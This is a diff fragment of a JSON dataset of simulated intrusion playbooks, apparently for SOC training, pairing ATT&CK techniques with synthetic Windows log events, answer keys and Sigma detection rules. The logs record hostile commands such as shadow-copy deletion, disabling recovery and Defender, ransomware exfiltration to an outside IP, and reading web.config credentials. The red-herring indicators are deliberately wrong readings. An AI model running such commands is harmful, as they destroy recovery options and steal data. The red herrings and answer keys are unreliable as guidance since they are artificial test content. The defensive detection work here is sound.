+          ],
+          "red_herring_indicators": [
+            "status: 200 (request completed successfully, therefore authorised)",
+            "bytes: 4096 (standard response size)",
+            "s_port: 443 (traffic was encrypted in transit)",
+            "cs_username: '-' (anonymous access is normal for public sites)"
+          ],
+          "correct_response_action": "Block IP/Domain",
+          "sigma_rule_yaml": "title: Detect Web Server Process Writing Executable Web Content\nid: b148f197-e7a9-426f-947e-f372b370584a\nstatus: experimental\ndescription: Detects an IIS worker process writing server-side script files into the web root, the typical outcome of exploiting a public-facing upload flaw.\nreferences:\n  - https://attack.mitre.org/techniques/T1190/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n      - '\\w3wp.exe'\n      - '\\httpd.exe'\n      - '\\nginx.exe'\n    TargetFilename|contains:\n      - '\\inetpub\\wwwroot\\'\n      - '\\wwwroot\\'\n      - '\\htdocs\\'\n    TargetFilename|endswith:\n      - '.php'\n      - '.aspx'\n      - '.asp'\n      - '.jsp'\n  filter_deploy:\n    Image|endswith: '\\msdeploy.exe'\n  condition: selection and not filter_deploy\nfalsepositives:\n  - Content management systems performing in-place plugin updates\nlevel: high\ntags:\n  - attack.initial_access\n  - attack.t1190\n"
+        },
+        {
+          "technique_id": "T1059.003",
+          "technique_name": "Windows Command Shell",
+          "tactic": "Execution",
+          "description": "The planted PHP handler is invoked to run cmd.exe under the IIS application pool identity, performing quick identity and network reconnaissance on the compromised host.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 4688,
+              "timestamp": "2026-07-24T02:43:27.115Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415",
+                "SubjectUserName": "WEB-DMZ-02$",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x3e5",
+                "NewProcessId": "0x1704",
+                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+                "TokenElevationType": "%%1936",
+                "ParentProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "CommandLine": "cmd.exe /c whoami && ipconfig /all",
+                "MandatoryLabel": "S-1-16-12288"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T02:43:27.118Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::server-tier-shell",
+                "UtcTime": "2026-07-24 02:43:27.118",
+                "ProcessGuid": "{a2c41f77-1e4f-6892-5a02-000000000b00}",
+                "ProcessId": "5892",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+                "OriginalFileName": "Cmd.Exe",
+                "CommandLine": "cmd.exe /c whoami && ipconfig /all",
+                "CurrentDirectory": "C:\\Windows\\system32\\inetsrv\\",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "IntegrityLevel": "High",
+                "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\" -ap \"DefaultAppPool\""
+              }
+            }
+          ],
+          "reference_indicators": [
+            "ParentProcessName: w3wp.exe spawning cmd.exe",
+            "CommandLine contains 'whoami' (identity reconnaissance)",
+            "CommandLine contains 'ipconfig /all' (network reconnaissance)",
+            "User: IIS APPPOOL\\DefaultAppPool executing an interactive shell",
+            "Command chaining with '&&' from a web tier process"
+          ],
+          "red_herring_indicators": [
+            "CurrentDirectory: C:\\Windows\\system32\\inetsrv\\ (suspicious working directory)",
+            "IntegrityLevel: High (proof of privilege escalation)",
+            "OriginalFileName: Cmd.Exe (binary has been renamed)",
+            "SubjectLogonId: 0x3e5 (interactive console session)"
+          ],
+          "correct_response_action": "Isolate Host",
+          "sigma_rule_yaml": "title: Detect Command Shell Spawned By IIS Worker Process\nid: 6ddec96d-0419-44d1-96f0-c6cba7fc3d39\nstatus: experimental\ndescription: Detects cmd.exe or PowerShell launched by the IIS worker process, indicating web shell or exploitation driven command execution.\nreferences:\n  - https://attack.mitre.org/techniques/T1059/003/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    ParentImage|endswith: '\\w3wp.exe'\n    Image|endswith:\n      - '\\cmd.exe'\n      - '\\powershell.exe'\n      - '\\pwsh.exe'\n      - '\\wscript.exe'\n  selection_recon:\n    CommandLine|contains:\n      - 'whoami'\n      - 'ipconfig'\n      - 'net user'\n      - 'systeminfo'\n      - 'nltest'\n  filter_health:\n    CommandLine|contains: 'appcmd.exe list requests'\n  condition: selection and selection_recon and not filter_health\nfalsepositives:\n  - Web applications that legitimately shell out for diagnostics\nlevel: critical\ntags:\n  - attack.execution\n  - attack.t1059.003\n"
+        },
+        {
+          "technique_id": "T1112",
+          "technique_name": "Modify Registry",
+          "tactic": "Persistence",
+          "description": "The payload is staged in C:\\ProgramData and registered under the machine Run key so it survives reboot, while a second registry write disables Defender's real-time anti-spyware protection.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T02:47:03.221Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:47:03.221",
+                "ProcessId": "5892",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+                "TargetFilename": "C:\\ProgramData\\lockbit.exe",
+                "CreationUtcTime": "2026-07-24 02:47:03.221",
+                "User": "IIS APPPOOL\\DefaultAppPool"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 13,
+              "timestamp": "2026-07-24T02:47:05.640Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "RuleName": "RegistryEvent::autorun-location-write",
+                "EventType": "SetValue",
+                "UtcTime": "2026-07-24 02:47:05.640",
+                "ProcessId": "6120",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater",
+                "Details": "C:\\ProgramData\\lockbit.exe",
+                "User": "NT AUTHORITY\\SYSTEM"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 13,
+              "timestamp": "2026-07-24T02:47:05.688Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "EventType": "SetValue",
+                "UtcTime": "2026-07-24 02:47:05.688",
+                "ProcessId": "6120",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+                "Details": "DWORD (0x00000001)",
+                "User": "NT AUTHORITY\\SYSTEM"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 13 TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater",
+            "Registry Details point to C:\\ProgramData\\lockbit.exe",
+            "Sysmon EID 13 SetValue on Windows Defender DisableAntiSpyware",
+            "Sysmon EID 11 executable written to C:\\ProgramData by cmd.exe",
+            "Run key value name 'SystemUpdater' masquerades as a Windows component"
+          ],
+          "red_herring_indicators": [
+            "EventType: SetValue (all registry writes use SetValue)",
+            "User: NT AUTHORITY\\SYSTEM (trusted built-in account, benign)",
+            "TargetObject is under HKLM (machine hive access is routine)",
+            "Details: DWORD (0x00000001) (a value of 1 always means enabled)"
+          ],
+          "correct_response_action": "Quarantine File",
+          "sigma_rule_yaml": "title: Detect Run Key Persistence And Defender Tampering\nid: 93d5b8b5-7b31-4bf7-b26f-615d57608e9d\nstatus: experimental\ndescription: Detects registry writes that create autorun persistence from a non-standard program directory or disable Microsoft Defender protection features.\nreferences:\n  - https://attack.mitre.org/techniques/T1112/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection_runkey:\n    TargetObject|contains: '\\CurrentVersion\\Run\\'\n    Details|contains:\n      - 'C:\\ProgramData\\'\n      - '\\AppData\\Local\\Temp\\'\n      - 'C:\\Users\\Public\\'\n  selection_defender:\n    TargetObject|contains:\n      - '\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware'\n      - '\\Real-Time Protection\\DisableRealtimeMonitoring'\n    Details: 'DWORD (0x00000001)'\n  filter_installer:\n    Image|endswith:\n      - '\\msiexec.exe'\n      - '\\TrustedInstaller.exe'\n  condition: (selection_runkey or selection_defender) and not filter_installer\nfalsepositives:\n  - Vendor installers that stage components in ProgramData\nlevel: high\ntags:\n  - attack.persistence\n  - attack.defense_evasion\n  - attack.t1112\n"
+        },
+        {
+          "technique_id": "T1490",
+          "technique_name": "Inhibit System Recovery",
+          "tactic": "Impact",
+          "description": "Immediately before encryption the operator deletes every volume shadow copy and disables Windows recovery, removing the victim's ability to roll back.",
+          "log_evidence": [
+            {
+              "channel": "Security",
+              "event_id": 4688,
+              "timestamp": "2026-07-24T02:51:44.330Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "SubjectUserName": "WEB-DMZ-02$",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x3e7",
+                "NewProcessId": "0x1c58",
+                "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
+                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+                "TokenElevationType": "%%1936",
+                "MandatoryLabel": "S-1-16-16384"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T02:51:44.334Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::system-utility-invocation",
+                "UtcTime": "2026-07-24 02:51:44.334",
+                "ProcessId": "7256",
+                "Image": "C:\\Windows\\System32\\vssadmin.exe",
+                "OriginalFileName": "VSSADMIN.EXE",
+                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+                "CurrentDirectory": "C:\\ProgramData\\",
+                "User": "NT AUTHORITY\\SYSTEM",
+                "IntegrityLevel": "System",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "ParentCommandLine": "cmd.exe /c C:\\ProgramData\\lockbit.exe --prepare"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T02:51:46.012Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:51:46.012",
+                "ProcessId": "7304",
+                "Image": "C:\\Windows\\System32\\bcdedit.exe",
+                "OriginalFileName": "bcdedit.exe",
+                "CommandLine": "bcdedit /set {default} recoveryenabled No",
+                "User": "NT AUTHORITY\\SYSTEM",
+                "IntegrityLevel": "System",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "CommandLine: vssadmin.exe delete shadows /all /quiet",
+            "vssadmin.exe spawned by cmd.exe rather than an administrative console",
+            "CommandLine: bcdedit /set {default} recoveryenabled No",
+            "ParentCommandLine references C:\\ProgramData\\lockbit.exe --prepare",
+            "Shadow copy deletion uses /quiet to suppress operator confirmation"
+          ],
+          "red_herring_indicators": [
+            "NewProcessName: vssadmin.exe (unsigned third-party binary)",
+            "ParentProcessName: cmd.exe (standard command interpreter, expected)",
+            "IntegrityLevel: System (normal for scheduled maintenance jobs)",
+            "SubjectLogonId: 0x3e7 (SYSTEM session, always trustworthy)"
+          ],
+          "correct_response_action": "Isolate Host",
+          "sigma_rule_yaml": "title: Detect Shadow Copy Deletion And Recovery Tampering\nid: f8da0872-84bd-4b24-bad1-20da8a5ca8eb\nstatus: experimental\ndescription: Detects destruction of volume shadow copies or disabling of Windows recovery, a precursor to ransomware encryption.\nreferences:\n  - https://attack.mitre.org/techniques/T1490/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_vss:\n    Image|endswith:\n      - '\\vssadmin.exe'\n      - '\\wmic.exe'\n    CommandLine|contains:\n      - 'delete shadows'\n      - 'shadowcopy delete'\n  selection_bcd:\n    Image|endswith: '\\bcdedit.exe'\n    CommandLine|contains:\n      - 'recoveryenabled No'\n      - 'bootstatuspolicy ignoreallfailures'\n  filter_backup:\n    ParentImage|endswith: '\\VeeamBackupSvc.exe'\n  condition: (selection_vss or selection_bcd) and not filter_backup\nfalsepositives:\n  - Backup products pruning their own shadow copies\nlevel: critical\ntags:\n  - attack.impact\n  - attack.t1490\n"
+        },
+        {
+          "technique_id": "T1486",
+          "technique_name": "Data Encrypted for Impact",
+          "tactic": "Impact",
+          "description": "The payload walks user profile directories, rewrites documents with a .locked extension and drops a ransom note in every traversed folder.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T02:53:02.774Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "RuleName": "FileCreate::user-profile-write",
+                "UtcTime": "2026-07-24 02:53:02.774",
+                "ProcessId": "6120",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "TargetFilename": "C:\\Users\\jdoe\\Documents\\Q4_Report.xlsx.locked",
+                "CreationUtcTime": "2026-07-24 02:53:02.774",
+                "User": "NT AUTHORITY\\SYSTEM"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4663,
+              "timestamp": "2026-07-24T02:53:02.780Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-18",
+                "SubjectUserName": "SYSTEM",
+                "SubjectDomainName": "NT AUTHORITY",
+                "SubjectLogonId": "0x3e7",
+                "ObjectServer": "Security",
+                "ObjectType": "File",
+                "ObjectName": "C:\\Users\\jdoe\\Documents\\",
+                "HandleId": "0x9c4",
+                "AccessMask": "0x2",
+                "AccessList": "%%4417",
+                "ProcessName": "C:\\ProgramData\\lockbit.exe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-24T02:53:04.118Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:53:04.118",
+                "ProcessId": "6120",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "TargetFilename": "C:\\Users\\jdoe\\Desktop\\!!!-Restore-My-Files-!!!.txt",
+                "CreationUtcTime": "2026-07-24 02:53:04.118",
+                "User": "NT AUTHORITY\\SYSTEM"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 11 file creation with a .locked extension",
+            "Image: C:\\ProgramData\\lockbit.exe writing into user document folders",
+            "Ransom note '!!!-Restore-My-Files-!!!.txt' created on the user Desktop",
+            "Security EID 4663 AccessMask: 0x2 (WriteData) across C:\\Users\\jdoe\\Documents\\",
+            "A single process rewriting many files in rapid succession"
+          ],
+          "red_herring_indicators": [
+            "SubjectUserName: SYSTEM (the operating system wrote these files)",
+            "ObjectName: C:\\Users\\jdoe\\Documents\\ (standard user profile folder)",
+            "ObjectServer: Security (audit subsystem entry, informational)",
+            "HandleId: 0x9c4 (handle value outside the expected range)"
+          ],
+          "correct_response_action": "Isolate Host",
+          "sigma_rule_yaml": "title: Detect Mass File Rename To Ransomware Extension\nid: fd39aacc-2b44-4a6f-8180-6a4d519ebebf\nstatus: experimental\ndescription: Detects creation of files with known ransomware extensions alongside ransom note filenames in user profile directories.\nreferences:\n  - https://attack.mitre.org/techniques/T1486/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection_ext:\n    TargetFilename|endswith:\n      - '.locked'\n      - '.lockbit'\n      - '.encrypted'\n      - '.crypt'\n  selection_note:\n    TargetFilename|contains:\n      - 'Restore-My-Files'\n      - 'HOW_TO_DECRYPT'\n      - 'READ_ME_FOR_DECRYPT'\n  filter_archive:\n    Image|endswith:\n      - '\\7z.exe'\n      - '\\WinRAR.exe'\n  condition: (selection_ext or selection_note) and not filter_archive\nfalsepositives:\n  - Encryption utilities that append a .encrypted suffix\nlevel: critical\ntags:\n  - attack.impact\n  - attack.t1486\n"
+        },
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "tactic": "Exfiltration",
+          "description": "Collected documents are shipped to the affiliate's leak-site staging server over the same channel the implant already uses for tasking, supporting the double-extortion model.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-24T02:58:31.004Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::programdata-binary",
+                "UtcTime": "2026-07-24 02:58:31.004",
+                "ProcessId": "7688",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "OriginalFileName": "-",
+                "CommandLine": "lockbit.exe --exfil --host 185.220.101.47",
+                "CurrentDirectory": "C:\\ProgramData\\",
+                "User": "NT AUTHORITY\\SYSTEM",
+                "IntegrityLevel": "System",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-24T02:58:31.552Z",
+              "computer": "WEB-DMZ-02.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-24 02:58:31.552",
+                "ProcessId": "7688",
+                "Image": "C:\\ProgramData\\lockbit.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.20.30.15",
+                "SourcePort": "50188",
+                "DestinationIp": "185.220.101.47",
+                "DestinationPort": "443",
+                "DestinationHostname": "-"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 1 CommandLine contains '--exfil --host 185.220.101.47'",
+            "Sysmon EID 3 outbound TCP/443 initiated by C:\\ProgramData\\lockbit.exe",
+            "DestinationIp 185.220.101.47 is not a sanctioned corporate destination",
+            "Exfiltration reuses the same host the implant beacons to",
+            "A non-browser binary in ProgramData establishing TLS-port egress"
+          ],
+          "red_herring_indicators": [
+            "DestinationPort: 443 (standard HTTPS traffic, therefore benign)",
+            "Protocol: tcp (normal transport protocol)",
+            "DestinationHostname: '-' (name resolution succeeded)",
+            "SourceIp: 10.20.30.15 (internal address, traffic stayed on the LAN)"
+          ],
+          "correct_response_action": "Block IP/Domain",
+          "sigma_rule_yaml": "title: Detect Exfiltration Command And Beacon To C2 Host\nid: 861dc82e-55da-423e-8e3b-fb7494568620\nstatus: experimental\ndescription: Detects a process launched with exfiltration arguments that subsequently initiates an outbound connection to the same operator controlled host.\nreferences:\n  - https://attack.mitre.org/techniques/T1041/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_cli:\n    CommandLine|contains:\n      - '--exfil'\n      - '-exfil'\n      - '--upload --host'\n  selection_path:\n    Image|contains:\n      - 'C:\\ProgramData\\'\n      - '\\AppData\\Local\\Temp\\'\n      - 'C:\\Users\\Public\\'\n  filter_signed:\n    Image|endswith: '\\OneDriveStandaloneUpdater.exe'\n  condition: selection_cli and selection_path and not filter_signed\nfalsepositives:\n  - Internal data migration tooling staged in ProgramData\nlevel: critical\ntags:\n  - attack.exfiltration\n  - attack.t1041\n  - attack.command_and_control\n"
+        }
+      ]
+    },
+    {
+      "playbook_id": "pb-silent-web-breach",
+      "name": "Silent Web Breach & Data Exfiltration",
+      "threat_actor": "Unnamed APT",
+      "difficulty": "Moderate",
+      "description": "A quiet, low-and-slow intrusion. The actor exploits an internet-facing application, plants an ASPX web shell for durable access, harvests a database connection string from web.config, authenticates to the SQL tier with the stolen service account, dumps the customer table, and uploads it to a public file-sharing service outside the C2 channel.",
+      "techniques": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access",
+          "description": "A scripted client abuses an unauthenticated upload endpoint on the external marketing site, achieving arbitrary file write in the IIS web root.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-IIS-Logging/Logs",
+              "event_id": 0,
+              "timestamp": "2026-07-22T03:02:47.000Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "method": "POST",
+                "uri": "/wp-admin/admin-ajax.php?action=upload_file",
+                "status": "200",
+                "bytes": "4096",
+                "user_agent": "python-requests/2.28.0",
+                "src_ip": "198.51.100.77",
+                "cs_username": "-",
+                "time_taken": "812",
+                "s_port": "443"
+              }
+            },
+            {
+              "channel": "Microsoft-IIS-Logging/Logs",
+              "event_id": 0,
+              "timestamp": "2026-07-22T03:02:41.000Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "method": "GET",
+                "uri": "/wp-admin/admin-ajax.php?action=upload_file",
+                "status": "403",
+                "bytes": "312",
+                "user_agent": "python-requests/2.28.0",
+                "src_ip": "198.51.100.77",
+                "cs_username": "-",
+                "time_taken": "44",
+                "s_port": "443"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 3,
+              "timestamp": "2026-07-22T03:02:49.615Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-22 03:02:49.615",
+                "ProcessId": "4416",
+                "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "Protocol": "tcp",
+                "Initiated": "true",
+                "SourceIp": "10.30.40.11",
+                "SourcePort": "50117",
+                "DestinationIp": "198.51.100.77",
+                "DestinationPort": "8443",
+                "DestinationHostname": "-"
+              }
+            }
+          ],
+          "reference_indicators": [
+            "HTTP POST to /wp-admin/admin-ajax.php?action=upload_file returned 200",
+            "user_agent: python-requests/2.28.0 indicates automated exploitation",
+            "Sysmon EID 3 w3wp.exe initiated an outbound connection to 198.51.100.77",
+            "A 403 probe from the same src_ip immediately precedes the successful POST",
+            "Web tier process performing outbound egress on a non-standard port"
+          ],
+          "red_herring_indicators": [
+            "uri contains '/wp-admin/' (routine administrator activity)",
+            "time_taken: 812 ms (abnormally slow response indicates DoS)",
+            "status: 403 on the first request (the attack was blocked)",
+            "SourceIp: 10.30.40.11 (internal address, no external exposure)"
+          ],
+          "correct_response_action": "Block IP/Domain",
+          "sigma_rule_yaml": "title: Detect Scripted Exploitation Of Public Upload Endpoint\nid: ab1c7cdd-7a77-483d-94c9-ebd0622a5bac\nstatus: experimental\ndescription: Detects non-browser user agents posting to administrative upload endpoints followed by outbound egress from the web worker process.\nreferences:\n  - https://attack.mitre.org/techniques/T1190/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: webserver\n  product: iis\ndetection:\n  selection_request:\n    cs_method: 'POST'\n    cs_uri_stem|contains:\n      - '/admin-ajax.php'\n      - '/upload'\n      - '/fileupload'\n    sc_status: 200\n  selection_agent:\n    cs_user_agent|contains:\n      - 'python-requests'\n      - 'curl/'\n      - 'Go-http-client'\n      - 'sqlmap'\n  filter_monitoring:\n    c_ip|startswith: '10.30.40.'\n  condition: selection_request and selection_agent and not filter_monitoring\nfalsepositives:\n  - Internal integration jobs that post files using scripted HTTP clients\nlevel: high\ntags:\n  - attack.initial_access\n  - attack.t1190\n"
+        },
+        {
+          "technique_id": "T1505.003",
+          "technique_name": "Web Shell",
+          "tactic": "Persistence",
+          "description": "An ASPX web shell is written into the uploads directory, giving the actor durable command execution that survives reboots and does not depend on the original exploit.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 11,
+              "timestamp": "2026-07-22T03:02:47.331Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "RuleName": "FileCreate::webroot-write",
+                "UtcTime": "2026-07-22 03:02:47.331",
+                "ProcessId": "4416",
+                "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "TargetFilename": "C:\\inetpub\\wwwroot\\uploads\\cmd.aspx",
+                "CreationUtcTime": "2026-07-22 03:02:47.331",
+                "User": "IIS APPPOOL\\DefaultAppPool"
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4688,
+              "timestamp": "2026-07-22T03:06:14.902Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415",
+                "SubjectUserName": "WEB-EXT-11$",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x3e5",
+                "NewProcessId": "0x1e40",
+                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+                "ParentProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "CommandLine": "cmd.exe /c dir C:\\Users",
+                "TokenElevationType": "%%1936",
+                "MandatoryLabel": "S-1-16-12288"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-22T03:06:14.905Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-22 03:06:14.905",
+                "ProcessId": "7736",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+                "OriginalFileName": "Cmd.Exe",
+                "CommandLine": "cmd.exe /c dir C:\\Users",
+                "CurrentDirectory": "C:\\Windows\\system32\\inetsrv\\",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "IntegrityLevel": "High",
+                "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\""
+              }
+            }
+          ],
+          "reference_indicators": [
+            "Sysmon EID 11 .aspx file written into C:\\inetpub\\wwwroot\\uploads\\",
+            "w3wp.exe wrote server-side executable web content at runtime",
+            "Security EID 4688 cmd.exe spawned by w3wp.exe",
+            "CommandLine: cmd.exe /c dir C:\\Users (filesystem enumeration from the web tier)",
+            "Command execution occurs minutes after the file write, from the same worker process"
+          ],
+          "red_herring_indicators": [
+            "TargetFilename resides under C:\\inetpub\\wwwroot (the normal web root, expected)",
+            "Image: w3wp.exe (signed IIS worker process, therefore trusted)",
+            "IntegrityLevel: High (routine for application pool identities)",
+            "OriginalFileName: Cmd.Exe (the binary was renamed to evade detection)"
+          ],
+          "correct_response_action": "Quarantine File",
+          "sigma_rule_yaml": "title: Detect ASPX Web Shell Drop In IIS Upload Directory\nid: 48c5850d-05d1-4dc9-9acf-4ac5eab617e2\nstatus: experimental\ndescription: Detects the IIS worker process creating an ASPX or ASHX file in an upload directory, the classic web shell persistence artefact.\nreferences:\n  - https://attack.mitre.org/techniques/T1505/003/\nauthor: BlackPerl DFIR\ndate: 2026/07/25\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\w3wp.exe'\n    TargetFilename|endswith:\n      - '.aspx'\n      - '.ashx'\n      - '.asmx'\n      - '.asp'\n  selection_path:\n    TargetFilename|contains:\n      - '\\uploads\\'\n      - '\\temp\\'\n      - '\\images\\'\n      - '\\App_Data\\'\n  filter_publish:\n    TargetFilename|contains: '\\App_Data\\_deploy\\'\n  condition: selection and selection_path and not filter_publish\nfalsepositives:\n  - Application deployment that writes views into a staging upload path\nlevel: critical\ntags:\n  - attack.persistence\n  - attack.t1505.003\n"
+        },
+        {
+          "technique_id": "T1552.001",
+          "technique_name": "Credentials In Files",
+          "tactic": "Credential Access",
+          "description": "Through the web shell the actor reads the application's web.config and filters it for connection strings, recovering a plaintext SQL service account password.",
+          "log_evidence": [
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-22T03:11:38.447Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "RuleName": "ProcessCreate::configuration-file-read",
+                "UtcTime": "2026-07-22 03:11:38.447",
+                "ProcessId": "7902",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+                "OriginalFileName": "Cmd.Exe",
+                "CommandLine": "cmd.exe /c type C:\\inetpub\\wwwroot\\web.config | findstr connectionString",
+                "CurrentDirectory": "C:\\Windows\\system32\\inetsrv\\",
+                "User": "IIS APPPOOL\\DefaultAppPool",
+                "IntegrityLevel": "High",
+                "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\""
+              }
+            },
+            {
+              "channel": "Security",
+              "event_id": 4663,
+              "timestamp": "2026-07-22T03:11:38.512Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "SubjectUserSid": "S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415",
+                "SubjectUserName": "IIS APPPOOL\\DefaultAppPool",
+                "SubjectDomainName": "CORP",
+                "SubjectLogonId": "0x3e5",
+                "ObjectServer": "Security",
+                "ObjectType": "File",
+                "ObjectName": "C:\\inetpub\\wwwroot\\web.config",
+                "HandleId": "0x5b8",
+                "AccessMask": "0x1",
+                "AccessList": "%%4416",
+                "ProcessName": "C:\\Windows\\System32\\cmd.exe"
+              }
+            },
+            {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "event_id": 1,
+              "timestamp": "2026-07-22T03:11:38.460Z",
+              "computer": "WEB-EXT-11.corp.internal",
+              "fields": {
+                "UtcTime": "2026-07-22 03:11:38.460",
